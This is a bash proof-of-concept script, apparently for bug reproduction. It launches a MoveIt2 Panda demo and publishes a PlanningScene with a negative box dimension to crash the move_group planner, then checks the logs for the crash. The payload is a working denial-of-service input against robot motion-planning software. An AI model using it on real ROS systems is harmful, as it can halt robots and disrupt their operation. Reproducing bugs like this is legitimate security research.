#!/usr/bin/env bash
set -eo pipefail

# Direct PoC (no RoboFuzz):
# Crash move_group by publishing a malformed PlanningScene collision object.

ROS_DISTRO="${ROS_DISTRO:-foxy}"
LAUNCH_LOG="${LAUNCH_LOG:-/tmp/moveit2_direct_repro.log}"
LAUNCH_PID_FILE="${LAUNCH_PID_FILE:-/tmp/moveit2_direct_repro.launch.pid}"
BAD_DIMENSION="${BAD_DIMENSION:--1.0}"

set +u
source "/opt/ros/${ROS_DISTRO}/setup.bash"
set -u

cleanup() {
  if [[ -f "${LAUNCH_PID_FILE}" ]]; then
    launch_pid="$(cat "${LAUNCH_PID_FILE}" 2>/dev/null || true)"
    if [[ -n "${launch_pid}" ]]; then
      kill "${launch_pid}" 2>/dev/null || true
      pkill -P "${launch_pid}" 2>/dev/null || true
    fi
    rm -f "${LAUNCH_PID_FILE}" || true
  fi

  pkill -f "/opt/ros/${ROS_DISTRO}/bin/ros2 launch moveit_resources_panda_moveit_config demo.launch.py" 2>/dev/null || true
  pkill -f "/opt/ros/${ROS_DISTRO}/lib/moveit_ros_move_group/move_group" 2>/dev/null || true
  pkill -f "/opt/ros/${ROS_DISTRO}/lib/controller_manager/ros2_control_node" 2>/dev/null || true
  pkill -f "/opt/ros/${ROS_DISTRO}/lib/robot_state_publisher/robot_state_publisher" 2>/dev/null || true
  pkill -f "ros2 run controller_manager spawner.py" 2>/dev/null || true
}

move_group_alive() {
  # Return 0 only if at least one non-zombie move_group process exists.
  ps -C move_group -o stat= 2>/dev/null | awk '$1 !~ /Z/ {found=1} END {exit(found?0:1)}'
}

trap cleanup EXIT

echo "[*] Cleaning stale processes"
cleanup
sleep 1

echo "[*] Launching MoveIt demo"
nohup ros2 launch moveit_resources_panda_moveit_config demo.launch.py rviz_tutorial:=True > "${LAUNCH_LOG}" 2>&1 &
echo "$!" > "${LAUNCH_PID_FILE}"

echo "[*] Waiting for move_group to come up"
ready=0
for _ in $(seq 1 80); do
  if move_group_alive; then
    ready=1
    break
  fi
  sleep 0.5
done

if [[ "${ready}" -ne 1 ]]; then
  echo "[!] move_group did not start in time"
  tail -n 120 "${LAUNCH_LOG}" || true
  exit 1
fi

echo "[*] Publishing malformed PlanningScene (BOX dimension = ${BAD_DIMENSION})"
export BAD_DIMENSION
python3 - <<'PY'
import os
import time

import rclpy
from geometry_msgs.msg import Pose
from moveit_msgs.msg import CollisionObject, PlanningScene
from shape_msgs.msg import SolidPrimitive

bad_dim = float(os.environ.get("BAD_DIMENSION", "-1.0"))

rclpy.init()
node = rclpy.create_node("moveit2_direct_repro_pub")
pub = node.create_publisher(PlanningScene, "/planning_scene", 10)

msg = PlanningScene()
msg.is_diff = True
msg.robot_state.is_diff = True

co = CollisionObject()
co.id = "poc_bad_box"
co.header.frame_id = "panda_link0"
co.operation = CollisionObject.ADD

primitive = SolidPrimitive()
primitive.type = SolidPrimitive.BOX
primitive.dimensions = [0.04, bad_dim, 0.04]
co.primitives = [primitive]

pose = Pose()
pose.position.x = 0.4
pose.position.y = 0.0
pose.position.z = 0.4
pose.orientation.w = 1.0
co.primitive_poses = [pose]

msg.world.collision_objects = [co]

for _ in range(10):
  pub.publish(msg)
  rclpy.spin_once(node, timeout_sec=0.05)
  time.sleep(0.1)

node.destroy_node()
rclpy.shutdown()
print("payload published")
PY

echo "[*] Waiting for crash signal"
crashed=0
for _ in $(seq 1 40); do
  if ! move_group_alive; then
    crashed=1
    break
  fi
  sleep 0.25
done

echo
if [[ "${crashed}" -eq 1 ]]; then
  echo "[OK] Reproduced: move_group exited after malformed PlanningScene input."
  echo "[*] Crash evidence (tail):"
  tail -n 160 "${LAUNCH_LOG}" | grep -E "move_group|terminate called|runtime_error|process has died|Box dimensions must be non-negative" || true
  exit 0
fi

echo "[FAIL] move_group is still alive; crash not reproduced in this run."
echo "[*] Last launch log lines:"
tail -n 160 "${LAUNCH_LOG}" || true
exit 1
